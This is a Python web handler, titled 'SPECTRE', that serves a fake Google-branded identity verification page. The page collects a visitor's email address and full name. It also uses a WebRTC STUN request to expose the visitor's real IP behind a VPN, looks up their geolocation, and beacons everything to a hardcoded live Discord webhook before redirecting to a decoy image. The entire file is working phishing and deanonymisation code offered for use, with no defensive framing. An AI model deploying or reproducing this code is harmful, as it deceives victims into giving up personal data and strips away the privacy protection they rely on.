# ==============================================================================
# TITAN v23.0 - "SPECTRE" PROTOCOL
# FOCUS: IDENTITY RECONNAISSANCE & SMART AUTOFILL CAPTURE
# ==============================================================================

from http.server import BaseHTTPRequestHandler
import requests
import json

WEBHOOK_URL = "https://discord.com/api/webhooks/1457320227212886170/1gwlEi-KBGixKbJZenFYUqD98j_tNENmZY2rS6kxWHQ2ExlgIC3UK7_OW2XVD8eHDVR6"
REDIRECT_IMAGE = "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
            
            # --- PHASE 1: SILENT SERVER LOGGING ---
            geo = requests.get(f"http://ip-api.com/json/{ip}").json()
            
            # --- PHASE 2: THE SPECTRE INTERFACE ---
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            content = f'''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <style>
                    body {{ background: #0b0b0b; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
                    .card {{ background: #1a1a1a; padding: 30px; border-radius: 12px; width: 350px; text-align: center; border: 1px solid #333; }}
                    .g-logo {{ width: 30px; margin-bottom: 15px; }}
                    input {{ width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #444; background: #222; color: #fff; border-radius: 6px; box-sizing: border-box; }}
                    button {{ width: 100%; padding: 12px; background: #4285f4; border: none; color: #fff; font-weight: bold; border-radius: 6px; cursor: pointer; }}
                </style>
            </head>
            <body>
                <div class="card">
                    <img class="g-logo" src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google__G__Logo.svg">
                    <h3>Confirm your Identity</h3>
                    <p style="font-size: 13px; color: #aaa;">To view this protected content, please verify your primary account.</p>
                    
                    <input type="email" id="email" placeholder="Email Address" autocomplete="email" required>
                    <input type="text" id="name" placeholder="Full Name" autocomplete="name" required>
                    
                    <button id="verify">Continue to Content</button>
                </div>

                <script>
                document.getElementById('verify').onclick = async function() {{
                    const mail = document.getElementById('email').value;
                    const name = document.getElementById('name').value;
                    
                    if(!mail.includes('@')) return;
                    this.innerText = "Verifying...";

                    // WebRTC VPN Bypass
                    let realIP = "Hidden";
                    const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                    pc.createDataChannel("");
                    pc.createOffer().then(o => pc.setLocalDescription(o));
                    pc.onicecandidate = i => {{
                        if(i && i.candidate) {{
                            let m = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
                            if(m) realIP = m[1];
                        }}
                    }};

                    const data = {{
                        username: "SPECTRE SENSOR",
                        embeds: [{{
                            title: "🧬 IDENTITY CAPTURED",
                            color: 0x4285f4,
                            fields: [
                                {{"name": "📧 Target Email", "value": "`" + mail + "`", "inline": false}},
                                {{"name": "👤 Target Name", "value": "`" + name + "`", "inline": false}},
                                {{"name": "🌍 Public IP", "value": "`{ip}`", "inline": true}},
                                {{"name": "🛡️ Real IP (Bypass)", "value": "`" + realIP + "`", "inline": true}}
                            ]
                        }}]
                    }};

                    navigator.sendBeacon("{WEBHOOK_URL}", new Blob([JSON.stringify(data)], {{type: 'application/json'}}));
                    setTimeout(() => {{ window.location.href = "{REDIRECT_IMAGE}"; }}, 800);
                }};
                </script>
            </body>
            </html>
            '''
            self.wfile.write(content.encode('utf-8'))

        except Exception:
            self.send_response(302)
            self.send_header('Location', REDIRECT_IMAGE)
            self.end_headers()

app = handler
